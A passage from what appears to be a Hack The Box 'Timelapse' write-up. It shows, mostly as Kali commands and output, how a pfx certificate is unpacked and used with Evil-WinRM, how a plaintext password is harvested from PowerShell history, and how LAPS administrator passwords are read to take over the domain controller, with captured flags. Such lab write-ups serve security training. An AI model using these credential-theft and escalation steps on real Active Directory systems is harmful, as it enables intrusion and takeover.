rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----     
```
- using openssl to 
	- pull the cert out of the pfx file
	- pull the key out of the pfx file
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy-client-cert.pem
Enter Import Password: thuglegacy

┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacy-client-key.pem           
Enter Import Password: thuglegacy
```
- using both key and cert with Evil-WinRmto login as legacyy user 
	-  and pulling user.txt flag
```bash
┌──(kali㉿kali)-[~/htb/timelapse]
└─$ evil-winrm -i 10.10.11.152 -c legacy-client-cert.pem -k legacy-client-key.pem -S           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy> dir

    Directory: C:\Users\legacyy

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir

    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/6/2025   3:37 PM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
ee584436b54b5054167a7624d50f8ee2g
```


## Reconnaissance & Initial Access

### PowerShell history discovery (initial foothold)

From an Evil-WinRM session, you inspected PSReadLine history for `legacyy` user and found commands that reveal credentials:
```bash
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> dir

    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt

*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```
- Key observations:
	- A plaintext password was stored in the PowerShell history: E3R$Q62^12p7PLlC%KWaxuaV.
	- A PSCredential was created for svc_deploy using that password.
	- Using the discovered credential with Evil-WinRM (service account)
	- Used the discovered svc_deploy credentials to connect via Evil-WinRM:
```bash
┌──(kali㉿kali)-[~/htb/timelapse]
└─$ evil-winrm -i [TARGET_IP] -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.7
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> dir
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_deploy> dir
[dir listing omitted here for brevity — shows profile dirs for svc_deploy]

```
- Enumerating account and group membership
```bash
*Evil-WinRM* PS C:\Users\TRX> net user svc_deploy

User name                    svc_deploy
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
- Important: svc_deploy is a member of the LAPS_Readers global group — this allows reading LAPS-managed local admin passwords stored in Actve Directory (ms-Mcs-AdmPwd).
### Post-Exploitation: Reading LAPS passwords
- AD cmdlets were present and read LAPS (ms-Mcs-AdmPwd) attributes:
```bash
*Evil-WinRM* PS C:\Users\TRX> Get-Command -Name Get-ADObject, Get-ADComputer -ErrorAction SilentlyContinue

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Get-ADObject                                       1.0.1.0    ActiveDirectory
Cmdlet          Get-ADComputer                                     1.0.1.0    ActiveDirectory

*Evil-WinRM* PS C:\Users\TRX> Get-ADObject -Filter * -Properties CN, ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object CN, ms-Mcs-AdmPwd

CN   ms-Mcs-AdmPwd
--   -------------
DC01 (nVu;.]+NC,79]r6;6-Ug9]}

```
- The Get-ADObject query returned a non-null ms-Mcs-AdmPwd value for DC01.
- The value returned appears to be the Administrator/password for that machine: (nVu;.]+NC,79]r6;6-Ug9]}
	- Note: LAPS stores local administrator passwords in the ms-Mcs-AdmPwd attribute for computer objects. Membership in a group allowed to read that attribute (here LAPS_Readers) is sufficient to retrieve it.
### Privilege Escalation: Using the retrieved password
- Using the recovered ms-Mcs-AdmPwd value to log in as Administrator:
```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i [TARGET_IP] -u administrator -p '(nVu;.]+NC,79]r6;6-Ug9]}' -S

Evil-WinRM shell v3.7
Warning: SSL enabled
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> cd TRX
*Evil-WinRM* PS C:\Users\TRX> dir
    Directory: C:\Users\TRX
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/6/2025   3:37 PM             34 root.txt

*Evil-WinRM* PS C:\Users\TRX\Desktop> cat root.txt
90c0b6c4098babb25dd25cf1875197be
```